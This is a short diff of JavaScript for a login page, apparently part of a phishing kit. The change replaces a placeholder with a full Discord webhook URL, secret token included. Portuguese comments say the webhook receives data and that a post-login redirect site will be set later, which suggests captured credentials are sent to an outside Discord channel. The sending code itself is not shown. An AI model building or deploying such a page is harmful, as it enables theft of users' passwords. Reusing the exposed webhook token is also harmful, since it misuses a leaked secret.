@@ -8,7 +8,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const forgotPasswordLink = document.getElementById('forgotPassword');
     
     // Webhook do Discord (substitua pelo seu)
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/seu-webhook-aqui';
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1429236562134302781/9aDDtdDEO18AtU_Z7s08oRx9vjwhaez9shQWO6P3Ycf0ljNPM5iEitEd1f_8p8Opj-o2';
     
     // Site para redirecionamento após login (você vai definir depois)
     const REDIRECT_URL = ''; // Você vai preencher depois
